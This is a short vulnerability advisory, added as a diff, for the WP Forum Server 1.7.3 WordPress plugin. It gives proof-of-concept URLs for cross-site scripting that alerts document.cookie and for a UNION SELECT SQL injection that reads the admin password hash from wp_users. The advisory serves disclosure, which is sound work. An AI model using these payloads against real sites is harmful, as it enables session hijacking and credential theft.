@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/53530/info
+
+WP Forum Server plugin for WordPress is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+WP Forum Server 1.7.3 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;vasthtml_action=structure&amp;do=addforum&amp;groupid=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E
+
+http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;vasthtml_action=structure&amp;do=editgroup&amp;groupid='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
+http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;vasthtml_action=structure&amp;do=editgroup&amp;groupid=2 AND 1=0 UNION SELECT user_pass FROM wp_users WHERE ID=1
+
+http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;vasthtml_action=usergroups&amp;do=edit_usergroup&amp;usergroup_id='&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt; 
